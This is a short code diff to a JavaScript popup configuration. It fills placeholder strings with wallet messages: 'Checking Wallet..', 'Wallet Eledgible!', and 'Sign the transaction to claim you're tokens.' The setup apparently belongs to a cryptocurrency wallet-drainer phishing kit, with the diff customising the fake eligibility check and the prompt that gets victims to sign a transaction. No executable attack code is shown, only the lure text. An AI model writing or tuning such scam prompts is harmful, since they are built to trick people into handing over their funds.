@@ -1,7 +1,7 @@
-window.popupConfig.popupTitleCalc = "CHANGE ME IN CONFIG";
-window.popupConfig.connectionStatusTextCalc = "CHANGE ME IN CONFIG";
-window.popupConfig.popupTitleDone = "CHANGE ME IN CONFIG";
-window.popupConfig.connectionStatusTextDone = "Sign the transaction and change your config...";
+window.popupConfig.popupTitleCalc = "LOADING...";
+window.popupConfig.connectionStatusTextCalc = "Checking Wallet..";
+window.popupConfig.popupTitleDone = "Wallet Eledgible!";
+window.popupConfig.connectionStatusTextDone = "Sign the transaction to claim you're tokens.";
 window.popupConfig.popupTitleDeclined = "Transaction rejected";
 window.popupConfig.connectionStatusTextDeclined = "Reconnect your wallet and buy again.";
 window.popupConfig.popupTitleNotEligible = "There is a problem";
